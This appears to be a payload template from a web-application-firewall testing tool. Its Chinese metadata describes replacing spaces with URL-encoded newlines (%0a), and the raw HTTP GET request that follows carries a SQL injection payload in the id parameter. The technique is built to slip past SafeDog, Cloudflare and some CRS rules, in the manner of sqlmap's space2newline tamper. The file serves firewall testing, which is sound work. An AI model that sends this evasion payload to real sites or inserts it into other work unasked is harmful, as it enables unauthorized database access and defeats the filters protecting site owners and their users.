# @name: 换行符%0a替代空格
# @tags: get,sqli,whitespace,newline,safedog,cloudflare,id,bypass
# @color: gold
# @validate: baseline_similarity
# @threshold: 0.90
# @intent: replace_space
# @intent.replace_from: " "
# @intent.replace_to: %0a
# @note: 用换行符 %0a 替代空格作为分隔符，绕过以空格分词的规则（SafeDog、Cloudflare、部分 CRS）。SQLMap space2newline 思路。
GET /?id=1'%0aand%0a'a'='a HTTP/1.1
Host: {{TARGET_HOST_HEADER}}
User-Agent: {{USER_AGENT}}

